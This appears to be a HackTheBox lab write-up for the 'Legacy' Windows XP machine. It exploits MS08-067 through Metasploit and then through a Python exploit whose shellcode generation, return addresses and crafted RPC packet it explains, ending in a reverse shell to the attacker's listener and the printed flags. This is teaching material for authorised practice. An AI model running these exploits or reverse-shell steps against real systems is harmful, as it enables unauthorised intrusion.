---
title: Legacy
date: 2024-03-20
difficulty: easy
os: windows
tags: smb
---

Hello, welcome to this write-up about the "Legacy" box on HackTheBox. This one is all about the `MS08-067` vulnerability, that was widely used in 2008 to distribute malware and steal sensitive data. This buffer overflow vulnerability involves sending a malicious packet that allows the attacker to hijack the execution flow. Let's dive in, starting easy with Metasploit doing all the work, and diving in deeper as we go along.

## Scanning

I'll start by running a port scan using the `nmap` program, making sure to be exhaustive by specifying `-p-` so all 65535 ports are scanned and not just the top (most common) 1000:

```bash
$ sudo nmap -p- 10.10.10.4

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-09 11:55 CEST
Nmap scan report for 10.10.10.4
Host is up (0.0094s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 24.87 seconds
```

This scan shows us there are `3` TCP ports open on Legacy.

### SMB

The SMB protocol, or Server Message Block protocol, is used to share files and printers and facilitates many other kinds of network communication. Used extensively by Microsoft, it has seen many vulnerabilities over its days, and is thus a frequent target for penetration testers. It runs on port 139 and 445.

To find which vulnerabilities our target has over SMB, let's start by scanning the version using `nmap`:

```bash
$ sudo nmap -p 139,445 -sV 10.10.10.4

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-12 17:16 CEST
Nmap scan report for 10.10.10.4
Host is up (0.020s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.56 seconds
```

This does not give us much besides that our target is running Microft Windows, which we already knew from the box description.

We can extend our scan by enabling some `nmap` scripts, notably the `smb-vuln` group of scripts, these will test for and list any SMB vulnerabilities present:

```bash
$ sudo nmap -p 139,445 -sV --script smb-vuln* 10.10.10.4

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-12 17:20 CEST
Nmap scan report for 10.10.10.4
Host is up (0.024s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.66 seconds
```

## Exploiting

One of these vulnerabilities is known as `MS08-067` (CVE-2008-4250). If we boot up Metasploit we can search through the available modules:

```bash
$ msfconsole

...

       =[ metasploit v6.4.56-dev                          ]
+ -- --=[ 2504 exploits - 1291 auxiliary - 393 post       ]
+ -- --=[ 1607 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search MS08-067

Matching Modules
================

   #   Name                                                             Disclosure Date  Rank   Check  Description
   -   ----                                                             ---------------  ----   -----  -----------
   0   exploit/windows/smb/ms08_067_netapi                              2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
   1     \_ target: Automatic Targeting                                 .                .      .      .
   2     \_ target: Windows 2000 Universal                              .                .      .      .
   3     \_ target: Windows XP SP0/SP1 Universal                        .                .      .      .
   4     \_ target: Windows 2003 SP0 Universal                          .                .      .      .
   5     \_ target: Windows XP SP2 English (AlwaysOn NX)                .                .      .      .
   6     \_ target: Windows XP SP2 English (NX)                         .                .      .      .
   7     \_ target: Windows XP SP3 English (AlwaysOn NX)                .                .      .      .
   8     \_ target: Windows XP SP3 English (NX)                         .                .      .      .
   9     \_ target: Windows XP SP2 Arabic (NX)                          .                .      .      .
   ...
   79    \_ target: Windows 2003 SP2 Italian (NX)                       .                .      .      .
   80    \_ target: Windows 2003 SP2 Russian (NX)                       .                .      .      .
   81    \_ target: Windows 2003 SP2 Swedish (NX)                       .                .      .      .
   82    \_ target: Windows 2003 SP2 Turkish (NX)                       .                .      .      .


Interact with a module by name or index. For example info 82, use 82 or use exploit/windows/smb/ms08_067_netapi
After interacting with a module you can manually set a TARGET with set TARGET 'Windows 2003 SP2 Turkish (NX)'
```

The name of the module is `ms08_067_netapi`! Let's try the exploit: we'll configure the relevant options in the Metasploit module:

```bash
msf6 > use exploit/windows/smb/ms08_067_netapi

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms08_067_netapi) > options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-m
                                       etasploit.html
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.64.8     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4

RHOSTS => 10.10.10.4

msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST tun0

LHOST => 10.10.14.17
```

`windows/meterpreter/reverse_tcp` is the payload we want so that means we are ready to go:

```bash
msf6 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.17:4444
[*] 10.10.10.4:445 - Automatically detecting the target...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.16/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (177734 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.17:4444 -> 10.10.10.4:1035) at 2025-04-12 18:16:37 +0200

meterpreter >
```

And we have a shell! This was so easy, and is why many people consider using Metasploit as cheating! To show the active username we can run `getuid`:

```bash
meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

Since we are already `SYSTEM` user, we can go ahead and claim both flags:

```bash
meterpreter > ls C:

Listing: C:
===========

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100777/rwxrwxrwx  0       fil   2017-03-16 06:30:44 +0100  AUTOEXEC.BAT
100666/rw-rw-rw-  0       fil   2017-03-16 06:30:44 +0100  CONFIG.SYS
040777/rwxrwxrwx  0       dir   2017-03-16 07:07:20 +0100  Documents and Settings
100444/r--r--r--  0       fil   2017-03-16 06:30:44 +0100  IO.SYS
100444/r--r--r--  0       fil   2017-03-16 06:30:44 +0100  MSDOS.SYS
100555/r-xr-xr-x  47564   fil   2008-04-13 22:13:04 +0200  NTDETECT.COM
040555/r-xr-xr-x  0       dir   2017-12-29 21:41:18 +0100  Program Files
040777/rwxrwxrwx  0       dir   2017-03-16 06:32:59 +0100  System Volume Information
040777/rwxrwxrwx  0       dir   2022-05-18 14:10:06 +0200  WINDOWS
100666/rw-rw-rw-  211     fil   2017-03-16 06:26:58 +0100  boot.ini
100444/r--r--r--  250048  fil   2008-04-14 00:01:44 +0200  ntldr
000000/---------  0       fif   1970-01-01 01:00:00 +0100  pagefile.sys
```

I'm looking for the `C:\Users` directory but it doesn't seem to be there! What? Check the operating system version:

```bash
meterpreter > sysinfo

Computer        : LEGACY
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
```

Windows XP! That is from before the `Users` directory was a thing! We'll find what we are looking for in `C:\Documents and Settings`:

```bash
meterpreter > ls "C:\Documents and Settings"

Listing: C:\Documents and Settings
==================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2017-03-16 07:07:21 +0100  Administrator
040777/rwxrwxrwx  0     dir   2017-03-16 06:29:48 +0100  All Users
040777/rwxrwxrwx  0     dir   2017-03-16 06:33:37 +0100  Default User
040777/rwxrwxrwx  0     dir   2017-03-16 06:32:52 +0100  LocalService
040777/rwxrwxrwx  0     dir   2017-03-16 06:32:43 +0100  NetworkService
040777/rwxrwxrwx  0     dir   2017-03-16 06:33:42 +0100  john
```

First we'll get John's flag:

```bash
meterpreter > ls "C:\Documents and Settings\john\Desktop"

Listing: C:\Documents and Settings\john\Desktop
===============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-03-16 07:19:49 +0100  user.txt

meterpreter > cat "C:\Documents and Settings\john\Desktop\user.txt"

e69af0e4f443de7e36876fda4e******
```

Then we'll go for `Administrator`:

```bash
meterpreter > ls "C:\Documents and Settings\Administrator\Desktop"

Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-03-16 07:18:50 +0100  root.txt

meterpreter > cat "C:\Documents and Settings\Administrator\Desktop\root.txt"

993442d258b0e0ec917cae9e6*******
```

## Manual w/o Metasploit

I want to attempt running this exploit manually without Metasploit or Meterpreter. This is good practice for OSCP and it might help me understand what this exploit is actually about.

We can search for explanations or scripts by either the name `CVE-2008-4250` or `MS08-067`.

I found a [Python script](https://gist.github.com/jrmdev/5881544269408edde11335ea2b5438de) on GitHub that looks promising. It requires [Impacket](https://github.com/fortra/impacket), a networking library for Python, that I already have installed (by default on Kali Linux).

### Script Analysis

Before we run this script, it is wise to read through it and understand what it's doing. **You can skip this section if you don't care about how the malicious code works.** I'll go over the most important snippets here:

#### Initialization

The script start off by collecting arguments and creating a new instance of the `SRVSVC_Exploit` class with these arguments:

```python
if __name__ == '__main__':
   # ...

   target, os, port, lhost, lport = sys.argv[1:]
   current = SRVSVC_Exploit(target, os, port, lhost, lport)
   current.run()
```

**NOTE:** `SRVSVC` here refers to `Windows Server Service`, a Windows service responsible for file and printer sharing running on _top_ of SMB. The vulnerability that we are working with here is a buffer overflow vulnerability in the Windows Server Service. If we send a carefully crafted packet of a specific size with specific characters, we can abuse a piece of code

Let's check out the `__init__` method on `SRVSVC_Exploit`:

```python
def __init__(self, target, os, port=445, lhost='0.0.0.0', lport=4444):
   super(SRVSVC_Exploit, self).__init__()

   self.port = port
   self.target = target
   self.os = os
   self.lhost = lhost
   self.lport = int(lport)

   # ...

   self.gen_shellcode()
```

#### Generating shellcode

Alright, so this calls `gen_shellcode`, so that's up next:

```python
def gen_shellcode(self):
    print("[+] Generating shellcode ...")
    res = runcmd(
        [
            "msfvenom",
            "-p",
            "windows/shell_reverse_tcp",
            "LHOST=%s" % self.lhost,
            "LPORT=%d" % self.lport,
            "EXITFUNC=thread",
            "-b",
            "\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40",
            "-f",
            "raw",
            "-a",
            "x86",
            "--platform",
            "windows",
        ],
        stdout=PIPE,
        stderr=DEVNULL,
    )
    self.shellcode = "\x90" * (410 - len(res.stdout)) + res.stdout.decode("latin-1")
```

Wow, this is really some special code, let's go over it line by line:

- `msfvenom` is a binary that generated shellcode payloads. "shellcode" is the piece of code we want to get to run on the target using our exploit, because its the part that connects back to us to give us a shell.
- `-p windows/shell_reverse_tcp` selects the `windows/shell_reverse_tcp` payload. We can find the source code for this payload at `/usr/share/metasploit-framework/modules/payloads/singles/windows/shell_reverse_tcp.rb`:

  ```ruby
  # ...

  def initialize(info = {})
     super(merge_info(info,
        'Name'          => 'Windows Command Shell, Reverse TCP Inline',
        'Description'   => 'Connect back to attacker and spawn a command shell',
        'Author'        => [ 'vlad902', 'sf' ],
        'License'       => MSF_LICENSE,
        'Platform'      => 'win',
        'Arch'          => ARCH_X86,
        'Handler'       => Msf::Handler::ReverseTcp,
        'Session'       => Msf::Sessions::CommandShell,
        'Payload'       =>
        {
           'Offsets' =>
              {
              'LPORT'    => [ 197, 'n'    ],
              'LHOST'    => [ 190, 'ADDR' ],
              'EXITFUNC' => [ 294, 'V'    ],
              },
           'Payload' =>
              "\xFC\xE8\x82\x00\x00\x00\x60\x89\xE5\x31\xC0\x64\x8B\x50\x30\x8B" +
              "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\xAC\x3C" +

              # ...

              "\x00\x53\xFF\xD5"
        }
        ))
  end
  end
  ```

  As you can see it defines 3 variables, which we will set next:

- `LHOST` is set to `self.lhost`
- `LPORT` is set to `self.lport`
- `EXITFUNC` is set to `thread`:
  | Option | What it does | When to use it |
  |------------|---------------------------------------------------------------|----------------------------------------------|
  | `process` | Terminates the **entire process** | Simple, but crashes the host app |
  | `thread` | Just exits the **current thread**, leaves the process running | Safer for exploits inside multi-threaded apps |
  | `seh` | Uses **Structured Exception Handling** to gracefully exit | Advanced, avoids hard crashes |

Moving on to remaining arguments to `msfvenom`:

- `-b \\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40` defines some "bad characters" that should be avoided in the generated payload:
  | Bad Character | ASCII Symbol | Reason to Avoid |
  |----------|---------------|-----------------------------------------------|
  | `\x00` | NUL | Null byte, often terminates strings early |
  | `\x0a` | `\n` | Line Feed, can break output or parsing |
  | `\x0d` | `\r` | Carriage Return, can also break formatting |
  | `\x5c` | `\` | Escape character, can mess with parsers |
  | `\x5f` | `_` | Sometimes used as a delimiter or reserved |
  | `\x2f` | `/` | Path separator, risky in file/path contexts |
  | `\x2e` | `.` | Used in file names, paths, structure, risky |
  | `\x40` | `@` | Used in emails/usernames, may cause issues |
- `-f raw` sets the output format
- `-a x86` sets the output architecture
- `--platform windows` sets the output platform

Then the final arguments to `runcmd`:

- `stdout=PIPE` means capture the standard output so we can use the shellcode in the script.
- `stderr=DEVNULL` discards any error messages from the command.

After `runcmd` we have the shellcode, and then there is just one more line part of this method:

```python
self.shellcode = "\x90" * (410 - len(res.stdout)) + res.stdout.decode("latin-1")
```

This prepends many `\x90` (`NOP` instruction on X86) to the shellcode so the final length becomes 410 bytes. This seemingly arbitrary number is not random at all, it is the amount of space we when we overflow the buffer as part of the exploit. If we write more than this (we could), then we risks memory corruption. By prepending many `NOP` bytes to the payload (a so called `NOP sled`), we place the shellcode where it needs to go beyond the end of the buffer.

There's one final piece of code to go over!

#### Triggering the buffer overflow with malicious DCE/RCP

```python
def run(self):
		self.__DCEPacket()
		self.__dce.call(0x1f, self.__stub)
```

What's inside `__DCEPacket` is the meat of the exploit but also the most complicated. I'll try my best to explain it, as far as I understand it myself:

```python
def __DCEPacket(self):
		nonxjmper = "\x08\x04\x02\x00%s" + "A" * 4 + "%s" + "A" * 42 + "\x90" * 8 + "\xeb\x62" + "A" * 10
```

This first line defines the basic format for the payload with a placeholder `%s`, a NOP sled `\x90 * 8` and a jump `\xeb\x62` (`jmp short 0x62`), jumping 98 bytes forward into the shellcode. It also has padding using `A` bytes.

Next up we define the return address that we want the target to `jmp` to:

```python
if self.os == '1':
   ret    = "\x61\x13\x00\x01"
   jumper = nonxjmper % (ret, ret)

# ...

elif self.os == '4':
   ret_dec    = "\x8c\x56\x90\x7c"  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
   ret_pop    = "\xf4\x7c\xa2\x7c"  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
   jmp_esp    = "\xd3\xfe\x86\x7c"  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
   disable_nx = "\x13\xe4\x83\x7c"  # 0x 7c 83 e4 13 NX disable @NTDLL.DLL
   jumper     = "\x08\x04\x02\x00%s%s%s" + "A" * 28 + "%s" + "\xeb\x02" + "\x90" * 2 + "\xeb\x62" % (ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)

# ...
```

Now that the jumper is ready, we establish the connection:

```python
print('[+] Initiating connection ...')

if self.port == '445':
   self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
else:
   self.__trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % self.target, dstport = int(self.port), filename = '\\browser' )

try:
   self.__trans.connect()
   self.__dce = self.__trans.DCERPC_class(self.__trans)
   self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))

except (SessionError, NetBIOSTimeout) as e:
   print("[-] Error: %s" % str(e))
   sys.exit(-1)

print('[+] Connected to ncacn_np:%s[\\pipe\\browser]' % self.target)
```

This establishes a connection to the Windows Server Service. If the port is 445, it sets up a `DCE/RPC` (Distributed Computing Environment / Remote Procedure Call) transport on top of SMB using `ncacn_np` (named pipe transport) with the `\\pipe\\browser` named pipe.

If the port is not 445, it establishes the connection using plain SMB instead, specifying the same `\\browser` named pipe over which the `DCE/RPC` interface is exposed by the Windows Server Service.

Lastly we craft our malicious packet:

```python
path        = "\x5c\x00" + "ABCDEFGHIJ" * 10 + self.shellcode
path       += "\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00" + jumper + "\x00" * 2
server      = "\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
prefix      = "\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
MaxCount    = "\x36\x01\x00\x00"
Offset      = "\x00\x00\x00\x00"
ActualCount = "\x36\x01\x00\x00"
self.__stub = server + MaxCount + Offset + ActualCount + path + "\xE8\x03\x00\x00" + prefix + "\x01\x10\x00\x00\x00\x00\x00\x00"
```

`self.__stub` is then sent over the connection to the named pipe interface, the buffer overflows, placing a `jmp` instruction at the location of a return address, which then gets invoked by Windows when it returns from the internal function with that return address, and the CPU jumps to the shellcode and executes it!

#### Analysis Concluded

That was by far the deepest I've ever dug into exploit interals, and it was a very teaching experience. I'm tired of reading hex bytes now, so let's pick up the pace and get those flags!

### Script to shell, finally

Time to run the script!

```bash
$ ls -l
total 8
-rw-rw-r-- 1 kali kali 7272 Apr 14 09:31 ms08-067.py

$ ./ms08-067.py
zsh: permission denied: ./ms08-067.py

$ chmod +x ./ms08-067.py

$ ls -l
total 8
-rwxrwxr-x 1 kali kali 7272 Apr 14 09:31 ms08-067.py

$ ./ms08-067.py

Usage: ./ms08-067.py <TARGET_IP> <OS> <PORT> <LHOST> <LPORT>

Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
```

Okay, so this describes the arguments, and importantly the possible values for `<OS>`: going from 1-6 based on the version of Windows and the service pack. We know that we are on Windows XP from the `nmap` scan, and we know from the previous Metasploit shell that is is `Service Pack 3 English`. But, if you are doing this without Metasploit at all, you wouldn't know that, and you'd have to try the three possible options(`1`, `5` and `6`).

So `<OS>` should be set to `6`. `<TARGET_IP>` is `10.10.10.4` and my IP is `10.10.14.17` and we'll use port `4444` on my side for the reverse shell:

```bash
$ ./ms08-067.py 10.10.10.4 6 445 10.10.14.17 4444

		@@@@@@@@@@    @@@@@@    @@@@@@@@    @@@@@@              @@@@@@@@     @@@@@@  @@@@@@@@
		@@@@@@@@@@@  @@@@@@@   @@@@@@@@@@  @@@@@@@@            @@@@@@@@@@   @@@@@@@  @@@@@@@@
		@@! @@! @@!  !@@       @@!   @@@@  @@!  @@@            @@!   @@@@  !@@            @@!
		!@! !@! !@!  !@!       !@!  @!@!@  !@!  @!@            !@!  @!@!@  !@!           !@!
		@!! !!@ @!@  !!@@!!    @!@ @! !@!   !@!!@!  @!@!@!@!@  @!@ @! !@!  !!@@!@!      @!!
		!@!   ! !@!   !!@!!!   !@!!!  !!!   !!@!!!  !!!@!@!!!  !@!!!  !!!  @!!@!!!!    !!!
		!!:     !!:       !:!  !!:!   !!!  !!:  !!!            !!:!   !!!  !:!  !:!   !!:
		:!:     :!:      !:!   :!:    !:!  :!:  !:!            :!:    !:!  :!:  !:!  :!:
		:::     ::   :::: ::   ::::::: ::  ::::: ::            ::::::: ::  :::: :::   ::
		 :      :    :: : :     : : :  :    : :  :              : : :  :    :: : :   : :


Windows XP SP3 English (NX)

[+] Generating shellcode ...
[+] Initiating connection ...
[+] Connected to ncacn_np:10.10.10.4[\pipe\browser]
[+] Please start a netcat listener: nc -lvp 4444, press enter to continue ...
```

Alright, let's follow the instructions and start up a listener, in a new terminal, where we will receive the incoming reverse shell, with `nc -lvnp 4444`. A quick recap, what are these flags?

- `-l` enables "listen mode"
- `-v` enables "verbose mode"
- `-n` disabled DNS resolution
- `-p` specifies the port (`4444` here)

```bash
$ nc -lvnp

listening on [any] 4444 ...
```

We are ready, so we'll hit ENTER back over in the terminal where we are running the script.

No more output appeared, so let's check the Netcat listener:

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.4] 1035
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

And we have a shell! As what user?

```powershell
C:\WINDOWS\system32>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.
```

Ooh, that is more challenging than I expected! Luckely enough I know the perfect solution, after all the SMB we've done today:

```bash
$ locate whoami.exe
/usr/share/windows-resources/binaries/whoami.exe
```

```bash
$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py kaas /usr/share/windows-binaries/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Then on the Windows XP system:

```powershell
C:\WINDOWS\system32> \\10.10.14.17\kaas\whoami.exe
```

Back over by the `smbserver.py`:

```bash
$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py kaas /usr/share/windows-binaries/
#...
[*] AUTHENTICATE_MESSAGE (\,LEGACY)
[*] User LEGACY\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Disconnecting Share(1:IPC$)
[*] Closing down connection (10.10.10.4,1040)
[*] Remaining connections []
```

And then the result:

```powershell
C:\WINDOWS\system32> \\10.10.14.17\kaas\whoami.exe
NT AUTHORITY\SYSTEM
```

We are root! And we did that over SMB!

### Manual monster-task concluded

Now that we managed to become `SYSTEM` without Metasploit, I think we deserve a real applause! Let's get the flags and take our well-earned break:

```powershell
C:\>type "Documents and Settings\Administrator\Desktop\root.txt"
993442d258b0e0ec917cae9e695d5713

C:\>type "Documents and Settings\john\Desktop\user.txt"
e69af0e4f443de7e36876fda4ec7644f
``
```

## Wrapping up

Thanks for coming along for the ride, and see you next time!
